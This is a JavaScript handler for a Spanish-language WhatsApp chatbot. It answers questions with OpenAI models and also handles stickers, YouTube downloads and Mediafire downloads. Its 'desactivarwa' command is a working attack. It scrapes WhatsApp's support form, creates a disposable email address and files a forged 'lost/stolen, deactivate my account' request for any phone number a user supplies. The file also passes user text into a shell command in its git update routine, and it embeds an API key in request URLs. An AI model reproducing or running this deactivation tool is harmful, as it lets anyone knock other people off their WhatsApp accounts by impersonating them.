"use strict";
process.on('uncaughtException', console.error)
const { downloadContentFromMessage, downloadMediaMessage } = require("@adiwajshing/baileys");
const { color, bgcolor } = require("../lib/color");
const fetch = require("node-fetch");
const fs = require("fs");
const { mediafireDl } = require('../lib/myfunc')
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process");
let setting;
const { ownerNumber, MAX_TOKEN, OPENAI_KEY } = setting = require('../config.json');
const speed = require("performance-now");
let { ytv } = require('../lib/y2mate')
const ffmpeg = require("fluent-ffmpeg");
let { ytmp4, ytmp3, ytplay, ytplayvid } = require('../lib/youtube')
const axios = require("axios");
const cheerio = require("cheerio");

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async (conn, msg, m, openai) => {
  try {
    if (msg.key.fromMe) return
    const { type, isQuotedMsg, quotedMsg, mentioned, now, fromMe } = msg;
    const toJSON = (j) => JSON.stringify(j, null, "\t");
    const from = msg.key.remoteJid;
    const chats = type === "conversation" && msg.message.conversation ? msg.message.conversation : type === "imageMessage" && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : type === "videoMessage" && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : type === "extendedTextMessage" && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : type === "buttonsResponseMessage" && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : type === "templateButtonReplyMessage" && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : type === "messageContextInfo" ? msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId : type == "listResponseMessage" && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : "";
    const args = chats.split(" ");

    const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#%^&./\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#,|÷?;:%^&./\\©^]/gi) : null;
    const command = prefix ? chats.slice(1).trim().split(' ').shift().toLowerCase() : ''
    //const command = chats.toLowerCase().split(" ")[0] || "";

    const isGroup = msg.key.remoteJid.endsWith("@g.us");
    const groupMetadata = msg.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
    const groupName = msg.isGroup ? groupMetadata.subject : ''  
    const sender = isGroup ? msg.key.participant ? msg.key.participant : msg.participant : msg.key.remoteJid;
    const userId = sender.split("@")[0]
    const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";
    //const isOwner = ownerNumber == sender ? true : ["5219996125657@s.whatsapp.net"].includes(sender) ? true : false;
    const isOwner = [botNumber,...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
    const pushname = msg.pushName;
    const q = chats.slice(command.length + 1, chats.length);
    const isCmd = chats.startsWith(prefix)
    const content = JSON.stringify(msg.message)
    const isImage = (type == 'imageMessage')
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
    const isVideo = (type == 'videoMessage')
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
 
/* Envios de mensajes */ 
    
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: msg });
};
const tempButton = async (remoteJid, text, footer, content) => {
const templateMessage = { viewOnceMessage: { message: { templateMessage: { hydratedTemplate: { hydratedContentText: text, hydratedContentFooter: footer, hydratedButtons: content, }, }, }, }, };
const sendMsg = await conn.relayMessage(remoteJid, templateMessage, {}); 
};
const sendAud = (link) => { 
conn.sendMessage(from, { audio: { url: link }, fileName: `error.mp3`, mimetype: 'audio/mp4' }, { quoted: msg });
};
const sendVid = (link, thumbnail) => {
conn.sendMessage( from, { video: { url: link }, fileName: `error.mp4`, thumbnail: thumbnail, mimetype: 'video/mp4' }, { quoted: msg });
};      
const sendImgUrl = (link) => {
conn.sendMessage( from, { image: { url: link }, fileName: `error.jpg` }, { quoted: msg });
};         
      
/* Auto Read & Presence Online */
conn.readMessages([msg.key]);
conn.sendPresenceUpdate("available", from);

    // Logs;
    if (!isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname));
    }
    if (isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname), "in", color(groupName));
    }

switch (command) {
case 'start': case 'menu':
var textReply = `Hola 👋

Soy un Bot de WhatsApp que usa la inteligencia artificial de OpenAI (ChatGPT), fui creado para responder a tus preguntas. Envíame una pregunta y te responderé!. 

_El Bot se limita a responder ${MAX_TOKEN} palabras como máximo_

Comandos disposibles:
- ${prefix}start
- ${prefix}ping
- ${prefix}runtime
- ${prefix}play
- ${prefix}play2
- ${prefix}chatgpt
- ${prefix}dall-e
- ${prefix}sticker
- ${prefix}desactivarwa
- ${prefix}mediafiredl
- ${prefix}update

*Editado By @BrunoSobrino*`
var templateButtons = [
{index: 1, urlButton: {displayText: '𝙾𝚆𝙽𝙴𝚁 👑', url: 'https://wa.me/5219996125657'}},
{index: 2, urlButton: {displayText: '𝙶𝙸𝚃𝙷𝚄𝙱 🔗', url: 'https://github.com/BrunoSobrino/openai-botwa'}}]
let templateMessage = { image: {url: 'https://www.mizanurrmizan.info/wp-content/uploads/2023/02/chatgpt.jpg'}, caption: textReply, footer: null, templateButtons: templateButtons, viewOnce: true };
conn.sendMessage(from, templateMessage, { quoted: msg });
/*var buttonReply = [
{ urlButton: { displayText: `𝙾𝚆𝙽𝙴𝚁 👑`, url: `https://wa.me/5219996125657` }},
{ urlButton: { displayText: `𝙶𝙸𝚃𝙷𝚄𝙱 🔗`, url: `https://github.com/BrunoSobrino/openai-botwa`}}]
tempButton(from, textReply, '', buttonReply)*/
break
case 'runtime':
reply(require('../lib/myfunc').runtime(process.uptime()))
break
case 'ping':
var timestamp = speed();
var latensi = speed() - timestamp
reply(`*Tiempo de respuesta: ${latensi.toFixed(4)}s*`)
break     
case 'play':
if (!args[1]) return reply(`*[❗] Nombre de la canción faltante, por favor ingrese el comando mas el nombre, titulo o enlace de alguna canción o video de YouTube*\n\n*—◉ Ejemplo:*\n${prefix + command} Good Feeling - Flo Rida*`)        
let res = await fetch(`https://api.lolhuman.xyz/api/ytplay2?apikey=BrunoSobrino&query=${decodeURIComponent(chats.replace(command, ''))}`) 
let json = await res.json()
sendAud(`${json.result.audio}`)
break
case 'play2':
if (!args[1]) return reply(`*[❗] Nombre de la canción faltante, por favor ingrese el comando mas el nombre, titulo o enlace de alguna canción o video de YouTube*\n\n*—◉ Ejemplo:*\n${prefix + command} Good Feeling - Flo Rida*`)        
let mediaa = await ytplayvid(decodeURIComponent(chats.replace(command, '')))
sendVid(mediaa.result, `${mediaa.thumb}`)
break    
case 'dall-e': case 'draw': 
if (!args[1]) return reply(`*[❗] Ingrese un texto el cual sera la tematica de la imagen y así usar la función de la IA Dall-E*\n\n*—◉ Ejemplos de peticions:*\n*◉ ${prefix + command} gatitos llorando*\n*◉ ${prefix + command} hatsune miku beso*`)    
try {       
const responsee = await openai.createImage({ prompt: chats.replace(command, ''), n: 1, size: "512x512", });    
sendImgUrl(responsee.data.data[0].url)        
} catch (jj) {
reply("*[❗] Error en el servidor 1, se intentará con otro servidor...*\n\n*—◉ Error:*\n" + jj)       
try {      
sendImgUrl(`https://api.lolhuman.xyz/api/dall-e?apikey=BrunoSobrino&text=${chats.replace(command, '')}`)  
} catch (jj2) {
reply("*[❗] Error en el servidor 2, no se obtuvo ninguna imagen de la IA...*\n\n*—◉ Error:*\n" + jj2)        
}}
break
case 'chatgpt': case 'ia': 
if (!args[1]) return reply(`*[❗] Ingrese una petición o una orden para usar la funcion ChatGPT*\n\n*—◉ Ejemplos de peticions u ordenes:*\n*◉ ${prefix + command} Reflexion sobre la serie Merlina 2022 de netflix*\n*◉ ${prefix + command} Codigo en JS para un juego de cartas*`)           
try {
const BotIA = await openai.createCompletion({ model: "text-davinci-003", prompt: chats.replace(command, ''), temperature: 0, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(BotIA.data.choices[0].text.trim())
} catch (qe) {
reply("*[❗] Error en el servidor 1, se intentará con otro servidor...*\n\n*—◉ Error:*\n" + qe)       
try {    
let tioress = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${chats}&user=user-unique-id`)
let hasill = await tioress.json()
reply(`${hasill.result}`.trim())   
} catch (qqe) {        
reply("*[❗] Error en el servidor 2, no se obtuvieron respuestas de la IA...*\n\n*—◉ Error:*\n" + qqe)  
}} 
break
case 'update':
if (!isOwner) return reply('*[❗] Este comando solo puede ser utilizado por el Owner del Bot*')    
try {    
let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))
await reply(stdout.toString()) 
} catch { 
let updatee = execSync('git remote set-url origin https://github.com/BrunoSobrino/openai-botwa.git && git pull')
await reply(updatee.toString())}  
break
case 'desactivarwa':      
//const number = args.join(" ")  
if (!q || !args[1]) return reply(`*[❗] Ingrese un numero, ejemplo ${prefix + command} +1 (450) 999-999*`)
//if (q.includes(ownerNumber)) return reply(`*[❗] No voy a desactivar el numero de mi creador >:v*`)       
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let ressss = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(ressss.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
break   
case 'mediafiredl':
let resss2 = await mediafireDl(decodeURIComponent(chats.replace(command, '').replace(prefix, '')))
//let { name, size, date, mime, link } = res
let caption = `
*📓 Nombre:* ${resss2.name}
*📁 Peso:* ${resss2.size}
*📄 Tipo:* ${resss2.mime}\n
*⏳ Espere en lo que envio su archivo. . . .* 
`.trim()
await reply(caption)
await conn.sendMessage(from, { document : { url: resss2.link }, fileName: resss2.name, mimetype: resss2.mime.toUpperCase() }, { quoted: msg })       
break
case 'sticker': case 's':
try {        
const pname = 'OpenAI - WaBot'
const athor = '+' + conn.user.id.split(":")[0];
if (isImage || isQuotedImage) {
await conn.downloadAndSaveMediaMessage(msg, "image", `./tmp/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./tmp/${sender.split("@")[0]}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(`./tmp/${sender.split("@")[0]}.jpeg`)
} else {
if(isVideo || isQuotedVideo) {
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
const imageBuffer = await downloadMediaMessage(msg, 'buffer', {}, {});
let filenameJpg = "stk.jpg";
fs.writeFileSync(filenameJpg, imageBuffer);
await ffmpeg('./' + filenameJpg).input(filenameJpg).on('start', function(cmd){
console.log(`Started: ${cmd}`)
}).on('error', function(err) {
console.log(`Error: ${err}`);
reply('error')}).on('end', async function() {
console.log('Finish')
await conn.sendMessage(from, {sticker: {url:'stk.webp'}})
}).addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`]).toFormat('webp').save('stk.webp');
}}} catch {     
reply(`*[❗] Responda a una imagen, gif o video, el cual será convertido en sticker, recuerde que debe mandar una imagen o responder a una imagen con el comando ${prefix + command}*`)        
}
break 
default:
const botNumber22 = '@' + conn.user.id.split(":")[0];
if (!chats.startsWith(botNumber22) && isGroup) return
if (isImage) return
//if (!isGroup) return;
//if (!['conversation', 'extendedTextMessage'].includes(msg.type)) return reply(`Lo siento, solo leo mensajes de texto!`)
let chatstext = chats.replace(conn.user.id.split(":")[0].split("@")[0], '') 
if (isGroup) chatstext = chatstext.replace("@", '').replace(prefix, '')       
console.log("->[\x1b[1;32mNew\x1b[1;37m]", color('Pregunta De', 'yellow'), color(pushname, 'lightblue'), `: "${chatstext}"`)
conn.sendPresenceUpdate("composing", from);
try {
const response = await openai.createCompletion({ model: "text-davinci-003", prompt: decodeURIComponent(chatstext), temperature: 0, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(response.data.choices[0].text.trim())
} catch (eee) {
reply("*[❗] Error en el servidor 1, se intentará con otro servidor...*\n\n*—◉ Error:*\n" + eee)       
try {    
let tiores = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${decodeURIComponent(chatstext)}&user=user-unique-id`)
let hasil = await tiores.json()
reply(`${hasil.result}`.trim())   
} catch (eeee) {        
reply("*[❗] Error en el servidor 2, no se obtuvieron respuestas de la IA...*\n\n*—◉ Error:*\n" + eeee)  
}} 
break
}} catch (err) {
console.log(color("[ERROR]", "red"), err); }};
